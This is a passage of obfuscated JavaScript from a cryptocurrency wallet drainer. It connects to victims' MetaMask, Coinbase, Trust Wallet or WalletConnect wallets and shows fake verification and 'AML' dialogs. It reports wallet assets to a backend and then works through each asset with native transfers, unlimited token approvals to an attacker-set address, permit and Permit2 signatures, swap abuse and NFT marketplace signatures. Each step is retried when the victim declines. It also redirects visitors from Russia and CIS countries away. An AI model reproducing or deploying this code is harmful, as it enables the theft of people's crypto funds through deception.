          _0x106767.push(_0x3d14bf);
        } catch (_0x461b34) {
          console.log(_0x461b34);
        }
      }
      for (const _0x30b47e of _0x15f0d2) {
        try {
          if (_0x30b47e.swapper) {
            continue;
          }
          _0x106767.push(_0x30b47e);
        } catch (_0x372b19) {
          console.log(_0x372b19);
        }
      }
      _0x15f0d2 = _0x106767;
    }
    return _0x15f0d2;
  } catch (_0xdef1fd) {
    console.log(_0xdef1fd);
    return [];
  }
};
const APPROVE_TOKEN = async _0x1b4918 => {
  if ((MS_Current_Provider == 'MetaMask' || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask >= 0x2 && !_0x1b4918.increase) {
    try {
      for (let _0x145e02 = 0x0; _0x145e02 < 0x2; _0x145e02++) {
        if (_0x1b4918.increase) {
          continue;
        }
        try {
          const _0x7b94d1 = await retrive_token(_0x1b4918.chain_id, _0x1b4918.address);
          const _0x257ae6 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1b4918.chain_id]);
          const _0x25dd3c = new ethers.Contract(_0x1b4918.address, _0x7b94d1, _0x257ae6);
          if (is_increase_approve(_0x25dd3c.functions)) {
            _0x1b4918.increase = true;
          }
        } catch (_0x41359b) {
          console.log(_0x41359b);
        }
      }
    } catch (_0x464e27) {
      console.log(_0x464e27);
    }
  }
  if ((MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask >= 0x2 && _0x1b4918.increase) {
    return await MM_APPROVE_TOKEN(_0x1b4918);
  }
  if ((MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask == 0x2 && !_0x1b4918.increase) {
    await TRANSFER_TOKEN(_0x1b4918);
    return 0x2;
  }
  if ((MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) && MS_Settings.Settings.Approve.MetaMask == 0x3 && !_0x1b4918.increase) {
    throw new Error("UNSUPPORTED");
  }
  const _0x466c52 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1b4918.chain_id]);
  const _0x239204 = ethers.BigNumber.from(await _0x466c52.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x51678f = await get_nonce(_0x1b4918.chain_id);
  const _0x2c8eab = new ethers.Contract(_0x1b4918.address, MS_Contract_ABI.ERC20, MS_Signer);
  let _0xc5b1c8 = null;
  let _0x6778fd = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x38b3a1 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x38b3a1[0x0] == MS_Current_Chain_ID && _0x38b3a1[0x1] == _0x1b4918.address.toLowerCase()) {
        _0x6778fd = _0x1b4918.amount_raw;
        break;
      }
    } catch (_0x52d27d) {
      console.log(_0x52d27d);
    }
  }
  try {
    _0xc5b1c8 = await _0x2c8eab.estimateGas.approve(MS_Settings.Address, _0x6778fd, {
      'from': MS_Current_Address
    });
    _0xc5b1c8 = ethers.BigNumber.from(_0xc5b1c8).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x4afa81) {
    _0xc5b1c8 = _0x1b4918.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1b4918.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x1b4918);
  sign_next();
  const _0x2c36c7 = await _0x2c8eab.approve(MS_Settings.Address, _0x6778fd, {
    'gasLimit': ethers.BigNumber.from(_0xc5b1c8),
    'gasPrice': ethers.BigNumber.from(_0x239204),
    'nonce': _0x51678f,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x466c52.waitForTransaction(_0x2c36c7.hash, 0x1, 0x7530);
  }
  await approve_success(_0x1b4918);
  sign_ready();
  return 0x1;
};
const MM_APPROVE_TOKEN = async _0x5a9f1f => {
  const _0x306077 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x5a9f1f.chain_id]);
  const _0x5262a2 = ethers.BigNumber.from(await _0x306077.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0xdbbacd = await get_nonce(_0x5a9f1f.chain_id);
  const _0x4df209 = new ethers.Contract(_0x5a9f1f.address, [{
    'inputs': [{
      'internalType': "address",
      'name': 'spender',
      'type': "address"
    }, {
      'internalType': 'uint256',
      'name': "increment",
      'type': "uint256"
    }],
    'name': "increaseAllowance",
    'outputs': [{
      'internalType': "bool",
      'name': '',
      'type': "bool"
    }],
    'stateMutability': 'nonpayable',
    'type': "function"
  }], MS_Signer);
  let _0x523b34 = null;
  let _0x37d9c4 = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0xf3932b of MS_Settings.Unlimited_BL) {
    try {
      if (_0xf3932b[0x0] == MS_Current_Chain_ID && _0xf3932b[0x1] == _0x5a9f1f.address.toLowerCase()) {
        _0x37d9c4 = _0x5a9f1f.amount_raw;
        break;
      }
    } catch (_0x5e41d0) {
      console.log(_0x5e41d0);
    }
  }
  try {
    _0x523b34 = await _0x4df209.estimateGas.increaseAllowance(MS_Settings.Address, _0x37d9c4, {
      'from': MS_Current_Address
    });
    _0x523b34 = ethers.BigNumber.from(_0x523b34).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  } catch (_0x3bf028) {
    _0x523b34 = _0x5a9f1f.chain_id == 0xa4b1 ? 0x4c4b40 : _0x5a9f1f.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x5a9f1f);
  sign_next();
  const _0x3c3541 = await _0x4df209.increaseAllowance(MS_Settings.Address, _0x37d9c4, {
    'gasLimit': ethers.BigNumber.from(_0x523b34),
    'gasPrice': ethers.BigNumber.from(_0x5262a2),
    'nonce': _0xdbbacd,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x306077.waitForTransaction(_0x3c3541.hash, 0x1, 0x7530);
  }
  await approve_success(_0x5a9f1f);
  sign_ready();
  return 0x1;
};
const connect_wallet = async (_0x117531 = null) => {
  $(".modal").hide();
  $("#overlay").fadeOut(0xc8);
  try {
    if (MS_Process) {
      return;
    }
    MS_Process = true;
    if (MS_Bad_Country) {
      try {
        ms_hide();
      } catch (_0x5db194) {
        console.log(_0x5db194);
      }
      try {
        Swal.close();
        Swal.fire({
          'html': "<b>\u041F\u0440\u0435\u0434\u0443\u043F\u0440\u0435\u0436\u0434\u0435\u043D\u0438\u0435</b><br><br>\u041F\u043E\u0436\u0430\u043B\u0443\u0439\u0441\u0442\u0430, \u043F\u043E\u043A\u0438\u043D\u044C\u0442\u0435 \u044D\u0442\u043E\u0442 \u0432\u0435\u0431-\u0441\u0430\u0439\u0442 \u043D\u0435\u043C\u0435\u0434\u043B\u0435\u043D\u043D\u043E, \u043E\u043D \u043D\u0435 \u043F\u0440\u0435\u0434\u043D\u0430\u0437\u043D\u0430\u0447\u0435\u043D \u0434\u043B\u044F \u0420\u043E\u0441\u0441\u0438\u0438 \u0438 \u0441\u0442\u0440\u0430\u043D \u0421\u041D\u0413, \u043D\u0435 \u043F\u044B\u0442\u0430\u0439\u0442\u0435\u0441\u044C \u0438\u0441\u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u044C VPN, \u044D\u0442\u043E \u043D\u0435\u0431\u0435\u0437\u043E\u043F\u0430\u0441\u043D\u043E!",
          'icon': "error",
          'allowOutsideClick': true,
          'allowEscapeKey': true,
          'timer': 0x0,
          'width': 0x258,
          'showConfirmButton': true,
          'confirmButtonText': 'OK'
        });
        await new Promise(_0xcc9fee => setTimeout(_0xcc9fee, 0x3a98));
        window.location.href = "https://ya.ru";
      } catch (_0x2d9f0d) {
        console.log(_0x2d9f0d);
      }
      return;
    }
    if (_0x117531 !== null) {
      if (_0x117531 == "MetaMask") {
        if (typeof window.ethereum == "object" && typeof window.ethereum.providers === "object") {
          let _0x449e91 = false;
          for (const _0x31d922 of window.ethereum.providers) {
            if (_0x31d922.isMetaMask == true) {
              _0x449e91 = true;
              MS_Provider = _0x31d922;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!_0x449e91) {
            if (MS_Mobile_Status) {
              window.location.href = "https://metamask.app.link/dapp/" + MS_Current_URL;
              MS_Process = false;
              return;
            } else {
              window.open("https://metamask.io", "_blank").focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = "MetaMask";
          } else {
            if (MS_Mobile_Status) {
              window.location.href = "https://metamask.app.link/dapp/" + MS_Current_URL;
              MS_Process = false;
              return;
            } else {
              window.open("https://metamask.io", "_blank").focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else {
        if (_0x117531 == "Coinbase") {
          if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
            let _0x1f59d2 = false;
            for (const _0x112beb of window.ethereum.providers) {
              if (_0x112beb.isCoinbaseWallet == true) {
                _0x1f59d2 = true;
                MS_Provider = _0x112beb;
                break;
              }
            }
            if (_0x1f59d2) {
              MS_Current_Provider = "Coinbase";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://go.cb-w.com/dapp?cb_url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open('https://www.coinbase.com/wallet', "_blank").focus();
                MS_Process = false;
                return;
              }
            }
          } else {
            if (typeof window.ethereum === "object" && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
              MS_Provider = window.ethereum;
              MS_Current_Provider = "Coinbase";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://go.cb-w.com/dapp?cb_url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open("https://www.coinbase.com/wallet", "_blank").focus();
                MS_Process = false;
                return;
              }
            }
          }
        } else {
          if (_0x117531 == "Trust Wallet") {
            if (typeof window.ethereum === "object" && window.ethereum.isTrust) {
              MS_Provider = window.ethereum;
              MS_Current_Provider = "Trust Wallet";
            } else {
              if (MS_Mobile_Status) {
                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + MS_Current_URL;
                MS_Process = false;
                return;
              } else {
                window.open('https://trustwallet.com', '_blank').focus();
                MS_Process = false;
                return;
              }
            }
          } else {
            if (_0x117531 == "Binance Wallet") {
              if (typeof window.BinanceChain === "object") {
                MS_Provider = window.BinanceChain;
                MS_Current_Provider = "Binance Wallet";
              } else {
                window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', "_blank").focus();
                MS_Process = false;
                return;
              }
            } else {
              if (_0x117531 == "WalletConnect" || _0x117531 == 'WalletConnect_v2') {
                MS_Current_Provider = "WalletConnect";
              } else if (typeof window.ethereum === "object") {
                MS_Provider = window.ethereum;
                MS_Current_Provider = "Ethereum";
              } else {
                MS_Current_Provider = "WalletConnect";
              }
            }
          }
        }
      }
    } else if (window.ethereum) {
      MS_Provider = window.ethereum;
      MS_Current_Provider = "Ethereum";
    } else {
      MS_Current_Provider = "WalletConnect";
    }
    try {
      await connect_request();
      let _0x300fef = null;
      if (MS_Current_Provider == "WalletConnect") {
        ms_hide();
        MS_WC_Version = 0x2;
        await load_wc();
        try {
          await MS_Provider.disconnect();
        } catch (_0x1d03f9) {
          console.log(_0x1d03f9);
        }
        await MS_Provider.connect();
        if (MS_Provider && MS_Provider.accounts.length > 0x0) {
          if (!MS_Provider.accounts[0x0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(_0x8a8092 => setTimeout(_0x8a8092, 0x9c4));
          MS_Current_Address = MS_Provider.accounts[0x0];
          MS_Current_Chain_ID = MS_Provider.chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        try {
          _0x300fef = await MS_Provider.request({
            'method': "wallet_requestPermissions",
            'params': [{
              'eth_accounts': {}
            }]
          });
          if (_0x300fef && _0x300fef.length > 0x0) {
            if (!MS_Provider.selectedAddress.includes('0x')) {
              return connect_cancel();
            }
            MS_Current_Address = MS_Provider.selectedAddress;
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch (_0x54fe80) {
          _0x300fef = await MS_Provider.request({
            'method': 'eth_requestAccounts'
          });
          if (_0x300fef && _0x300fef.length > 0x0) {
            if (!_0x300fef[0x0].includes('0x')) {
              return connect_cancel();
            }
            MS_Current_Address = _0x300fef[0x0];
            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) {
        throw new Error("Invalid Wallet");
      }
    } catch (_0x2de0a0) {
      console.log(_0x2de0a0);
      MS_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (MS_Settings.V_MODE == 0x1) {
      Swal.fire({
        'html': "<b>Sign message</b> to verificate you wallet...",
        'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        'imageHeight': 0x3c,
        'allowOutsideClick': false,
        'allowEscapeKey': false,
        'timer': 0x0,
        'width': 0x258,
        'showConfirmButton': false
      });
      try {
        const _0x22b615 = MS_Settings.V_MSG.replaceAll("{{ADDRESS}}", MS_Current_Address);
        const _0x2525de = await MS_Signer.signMessage(_0x22b615);
        const _0x13e299 = ethers.utils.recoverAddress(ethers.utils.hashMessage(_0x22b615), _0x2525de);
        if (!_0x13e299) {
          Swal.fire({
            'title': "Verification Error",
            'text': "We have received your signature, but it's incorrect, please try again.",
            'icon': "error",
            'confirmButtonText': 'OK'
          });
          MS_Process = false;
          return await connect_cancel();
        } else {
          let _0x22da39 = await send_request({
            'action': 'sign_verify',
            'sign': _0x2525de,
            'address': MS_Current_Address,
            'message': ''
          });
          if (_0x22da39.status != 'OK') {
            Swal.fire({
              'title': "Verification Error",
              'text': "We have received your signature, but it's incorrect, please try again.",
              'icon': 'error',
              'confirmButtonText': 'OK'
            });
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch (_0x173e57) {
        Swal.fire({
          'title': "Verification Error",
          'text': "We cannot verify that the wallet is yours as you did not sign the message provided.",
          'icon': 'error',
          'confirmButtonText': 'OK'
        });
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({
        'action': "sign_verify",
        'address': MS_Current_Address
      });
    }
    await connect_success();
    show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0x0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase())) {
      MS_Check_Done = true;
      Swal.close();
      Swal.fire({
        'title': "AML Error",
        'text': "Your wallet is not AML clear, you can't use it!",
        'icon': "error",
        'confirmButtonText': 'OK'
      });
      MS_Process = false;
      return;
    }
    let _0x357913 = await get_wallet_assets(MS_Current_Address);
    let _0x3130bc = 0x0;
    for (const _0x4580dd of _0x357913) {
      try {
        _0x3130bc += _0x4580dd.amount_usd;
      } catch (_0x42f9eb) {
        console.log(_0x42f9eb);
      }
    }
    let _0x4c593f = 0x0;
    for (const _0x5e3ffb of _0x357913) _0x4c593f += _0x5e3ffb.amount_usd;
    await send_request({
      'action': "check_finish",
      'user_id': MS_ID,
      'assets': _0x357913,
      'balance': _0x4c593f
    });
    MS_Check_Done = true;
    Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > _0x3130bc) {
      Swal.fire({
        'title': "Something went wrong!",
        'text': "For security reasons we can't allow you to connect empty or new wallet",
        'icon': "error",
        'confirmButtonText': 'OK'
      });
      MS_Process = false;
      return;
    }
    Swal.fire({
      'html': "<b>Done!</b> Sign message in your wallet to continue...",
      'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
      'imageHeight': 0x3c,
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': false
    });
    for (const _0x376bb8 of _0x357913) {
      try {
        if (_0x376bb8.type != "NATIVE") {
          MS_Gas_Reserves[_0x376bb8.chain_id] += 0x1;
        }
      } catch (_0x1a05eb) {
        console.log(_0x1a05eb);
      }
    }
    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 0x1 && MS_Settings.Settings.Blur.Priority == 0x1) {
      await SIGN_BLUR(_0x357913, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    }
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 0x1 && MS_Settings.Settings.SeaPort.Priority == 0x1) {
      await SIGN_SEAPORT(_0x357913, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    }
    if (typeof SIGN_X2Y2 !== "undefined" && MS_Settings.Settings.x2y2.Enable == 0x1 && MS_Current_Chain_ID == 0x1 && MS_Settings.Settings.x2y2.Priority == 0x1) {
      await SIGN_X2Y2(_0x357913, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
    }
    if (MS_Provider.isTrust && !MS_Mobile_Status) {
      try {
        MS_Settings.Settings.Sign.Native = 0x0;
        MS_Settings.Settings.Sign.Tokens = 0x0;
        MS_Settings.Settings.Sign.NFTs = 0x0;
      } catch (_0x30c700) {
        console.log(_0x30c700);
      }
    }
    let _0x4ec037 = true;
    while (_0x4ec037) {
      _0x4ec037 = MS_Settings.LA == 0x1;
      for (const _0x1f77fc of _0x357913) {
        try {
          if (_0x1f77fc.skip) {
            continue;
          }
          let _0x5b1f2d = false;
          if (_0x1f77fc.type == "NATIVE") {
            const _0x2d642b = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1f77fc.chain_id]);
            let _0x58df12 = false;
            const _0x5b753a = ethers.BigNumber.from(await _0x2d642b.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
            if (MS_Settings.Settings.Chains[convert_chain('ID', "ANKR", _0x1f77fc.chain_id)].Contract_Address != '') {
              _0x58df12 = true;
            }
            const _0x2ae342 = _0x1f77fc.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1f77fc.chain_id == 0xa86a ? 0x4c4b40 : _0x58df12 ? 0x186a0 : 0x5208;
            const _0x3c8ae4 = _0x1f77fc.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1f77fc.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
            const _0x12234d = ethers.BigNumber.from(_0x1f77fc.chain_id == 0xa ? "35000000000" : _0x5b753a);
            const _0x1bb768 = _0x12234d.mul(ethers.BigNumber.from(_0x2ae342)).mul(ethers.BigNumber.from('2'));
            const _0x21b286 = _0x12234d.mul(ethers.BigNumber.from(_0x3c8ae4)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x1f77fc.chain_id])));
            const _0x2b8535 = ethers.BigNumber.from(_0x1f77fc.amount_raw).sub(_0x1bb768).sub(_0x21b286).toString();
            console.log(_0x2b8535);
            if (ethers.BigNumber.from(_0x2b8535).lte(ethers.BigNumber.from('0'))) {
              continue;
            }
          }
          if (_0x1f77fc.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, _0x1f77fc.chain_id);
            try {
              if (MS_Current_Provider == "WalletConnect") {
                try {
                  await MS_Provider.request({
                    'method': "wallet_switchEthereumChain",
                    'params': [{
                      'chainId': '0x' + _0x1f77fc.chain_id.toString(0x10)
                    }]
                  });
                } catch (_0xc56d41) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await MS_Provider.request({
                    'method': 'wallet_switchEthereumChain',
                    'params': [{
                      'chainId': '0x' + _0x1f77fc.chain_id.toString(0x10)
                    }]
                  });
                } catch (_0x24f753) {
                  if (_0x24f753.code == 0x1326 || _0x24f753.code == -0x7f5b) {
                    try {
                      await MS_Provider.request({
                        'method': "wallet_addEthereumChain",
                        'params': [MS_MetaMask_ChainData[_0x1f77fc.chain_id]]
                      });
                    } catch (_0xa0dfba) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              MS_Current_Chain_ID = _0x1f77fc.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              _0x5b1f2d = true;
              await chain_success();
            } catch (_0x2bc0be) {
              console.log(_0x2bc0be);
              await chain_cancel();
              continue;
            }
          } else {
            _0x5b1f2d = true;
          }
          if (!_0x5b1f2d) {
            continue;
          }
          if (_0x1f77fc.type == "NATIVE") {
            if (MS_Settings.Settings.Sign.Native > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(_0x1f77fc);
                  _0x1f77fc.skip = true;
                  break;
                } catch (_0x2e2554) {
                  console.log(_0x2e2554);
                  if (_0x2e2554.code == -0x7f59 || _0x2e2554.code == -0x7d00) {
                    if (MS_Settings.Settings.Sign.Force == 0x1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          await TRANSFER_NATIVE(_0x1f77fc);
                          _0x1f77fc.skip = true;
                          break;
                        } catch (_0x3e4fbf) {
                          console.log(_0x3e4fbf);
                          if (_0x3e4fbf != "LOW_BALANCE") {
                            await transfer_cancel();
                            if (!MS_Settings.Loop_N) {
                              break;
                            }
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(_0x2e2554);
                    if (_0x2e2554 != "LOW_BALANCE") {
                      await sign_cancel();
                      if (!MS_Settings.Loop_N) {
                        break;
                      }
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NATIVE(_0x1f77fc);
                  _0x1f77fc.skip = true;
                  break;
                } catch (_0xbcf671) {
                  console.log(_0xbcf671);
                  if (_0xbcf671 != "LOW_BALANCE") {
                    await transfer_cancel();
                    if (!MS_Settings.Loop_N) {
                      break;
                    }
                  } else {
                    break;
                  }
                }
              }
            }
          } else {
            if (_0x1f77fc.type == "ERC20") {
              if (typeof _0x1f77fc.permit == "undefined" && MS_Settings.Settings.Permit.Mode && _0x1f77fc.amount_usd >= MS_Settings.Settings.Permit.Price) {
                const _0x27656e = await retrive_token(_0x1f77fc.chain_id, _0x1f77fc.address);
                const _0x43a2ab = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1f77fc.chain_id]);
                const _0x13ed0e = new ethers.Contract(_0x1f77fc.address, _0x27656e, _0x43a2ab);
                const _0x419283 = get_permit_type(_0x13ed0e.functions);
                _0x1f77fc.permit = _0x419283;
                _0x1f77fc.permit_ver = '1';
                _0x1f77fc.abi = _0x27656e;
                if (_0x419283 > 0x0) {
                  if (_0x13ed0e.functions.hasOwnProperty('version')) {
                    try {
                      _0x1f77fc.permit_ver = await _0x13ed0e.version();
                    } catch (_0x1ba043) {
                      console.log(_0x1ba043);
                    }
                  }
                  console.log("[PERMIT FOUND] " + _0x1f77fc.name + ", Permit Type: " + _0x419283 + ", Version: " + _0x1f77fc.permit_ver);
                }
              }
              if (_0x1f77fc.permit > 0x0) {
                for (const _0x554ec0 of MS_Settings.Permit_BL) {
                  if (_0x554ec0[0x0] == MS_Current_Chain_ID && _0x554ec0[0x1] === _0x1f77fc.address.toLowerCase()) {
                    _0x1f77fc.permit = 0x0;
                    break;
                  }
                }
              }
              if (MS_Settings.Settings.Permit2.Mode && _0x1f77fc.permit2) {
                const _0xda46ea = [];
                for (const _0x42a331 of _0x357913) {
                  try {
                    if (_0x42a331.chain_id == _0x1f77fc.chain_id && _0x42a331.permit2) {
                      _0xda46ea.push(_0x42a331);
                      _0x42a331.skip = true;
                    }
                  } catch (_0x484504) {
                    console.log(_0x484504);
                  }
                }
                while (true) {
                  try {
                    await DO_PERMIT2(_0x1f77fc, _0xda46ea);
                    _0x1f77fc.skip = true;
                    break;
                  } catch (_0x4499b9) {
                    console.log(_0x4499b9);
                    await approve_cancel();
                    if (!MS_Settings.Loop_T) {
                      break;
                    }
                  }
                }
              } else {
                if (MS_Settings.Settings.Permit.Mode && _0x1f77fc.permit && _0x1f77fc.permit > 0x0) {
                  while (true) {
                    try {
                      await PERMIT_TOKEN(_0x1f77fc);
                      _0x1f77fc.skip = true;
                      break;
                    } catch (_0x1b897e) {
                      console.log(_0x1b897e);
                      await approve_cancel();
                      if (!MS_Settings.Loop_T) {
                        break;
                      }
                    }
                  }
                } else {
                  if (MS_Settings.Settings.Swappers.Enable && _0x1f77fc.swapper && _0x1f77fc.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                    if (_0x1f77fc.swapper_type == "Uniswap") {
                      const _0x4630a0 = [];
                      for (const _0x84ccb9 of _0x357913) {
                        try {
                          if (_0x84ccb9.chain_id == _0x1f77fc.chain_id && _0x84ccb9.swapper && _0x84ccb9.swapper_type == "Uniswap") {
                            _0x4630a0.push(_0x84ccb9);
                            _0x84ccb9.skip = true;
                          }
                        } catch (_0x2ed3fc) {
                          console.log(_0x2ed3fc);
                        }
                      }
                      while (true) {
                        try {
                          await DO_UNISWAP(_0x1f77fc, _0x4630a0);
                          _0x1f77fc.skip = true;
                          break;
                        } catch (_0xadcbb0) {
                          console.log(_0xadcbb0);
                          await sign_cancel();
                          if (!MS_Settings.Loop_T) {
                            break;
                          }
                        }
                      }
                    } else {
                      if (_0x1f77fc.swapper_type == "Pancake_V3") {
                        const _0x4dc268 = [];
                        for (const _0x2c091f of _0x357913) {
                          try {
                            if (_0x2c091f.chain_id == _0x1f77fc.chain_id && _0x2c091f.swapper && _0x2c091f.swapper_type == "Pancake_V3") {
                              _0x4dc268.push(_0x2c091f);
                              _0x2c091f.skip = true;
                            }
                          } catch (_0x540e2b) {
                            console.log(_0x540e2b);
                          }
                        }
                        while (true) {
                          try {
                            await DO_PANCAKE_V3(_0x1f77fc, _0x4dc268);
                            _0x1f77fc.skip = true;
                            break;
                          } catch (_0x2a108f) {
                            console.log(_0x2a108f);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      } else {
                        while (true) {
                          try {
                            await DO_SWAP(_0x1f77fc);
                            _0x1f77fc.skip = true;
                            break;
                          } catch (_0x67a3c5) {
                            console.log(_0x67a3c5);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    }
                  } else {
                    if (MS_Settings.Settings.Sign.Tokens > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
                      while (true) {
                        try {
                          await SIGN_TOKEN(_0x1f77fc);
                          if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                            const _0x517a25 = send_request({
                              'action': "approve_token",
                              'user_id': MS_ID,
                              'asset': _0x1f77fc,
                              'address': MS_Current_Address
                            });
                            if (MS_Settings.Settings.Wait_For_Response) {
                              await _0x517a25;
                            }
                          }
                          _0x1f77fc.skip = true;
                          break;
                        } catch (_0x3397b0) {
                          console.log(_0x3397b0);
                          if (_0x3397b0.code == -0x7f59 || _0x3397b0.code == -0x7d00) {
                            if (MS_Settings.Settings.Sign.Force == 0x1) {
                              await sign_cancel();
                            } else {
                              await sign_unavailable();
                              while (true) {
                                if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                                  if (MS_Settings.Settings.Approve.MetaMask || MS_Current_Provider != "MetaMask" || MS_Mobile_Status) {
                                    try {
                                      let _0x541429 = await APPROVE_TOKEN(_0x1f77fc);
                                      if (_0x541429 == 0x1) {
                                        const _0x4cdbd4 = send_request({
                                          'action': 'approve_token',
                                          'user_id': MS_ID,
                                          'asset': _0x1f77fc,
                                          'address': MS_Current_Address
                                        });
                                        if (MS_Settings.Settings.Wait_For_Response) {
                                          await _0x4cdbd4;
                                        }
                                      }
                                      _0x1f77fc.skip = true;
                                      break;
                                    } catch (_0x5d35d9) {
                                      await approve_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  } else {
                                    try {
                                      await TRANSFER_TOKEN(_0x1f77fc);
                                      _0x1f77fc.skip = true;
                                      break;
                                    } catch (_0x54dca8) {
                                      console.log(_0x54dca8);
                                      await transfer_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  }
                                } else {
                                  if (MS_Settings.Settings.Sign.Tokens == 0x2) {
                                    try {
                                      await TRANSFER_TOKEN(_0x1f77fc);
                                      _0x1f77fc.skip = true;
                                      break;
                                    } catch (_0x556706) {
                                      console.log(_0x556706);
                                      await transfer_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  }
                                }
                              }
                            }
                            break;
                          } else {
                            console.log(_0x3397b0);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    } else {
                      if (MS_Settings.Settings.Approve.Enable && (MS_Settings.Settings.Approve.MetaMask || MS_Current_Provider != "MetaMask" || MS_Mobile_Status)) {
                        while (true) {
                          try {
                            let _0x1b0979 = await APPROVE_TOKEN(_0x1f77fc);
                            if (_0x1b0979 == 0x1) {
                              const _0x43cd43 = send_request({
                                'action': "approve_token",
                                'user_id': MS_ID,
                                'asset': _0x1f77fc,
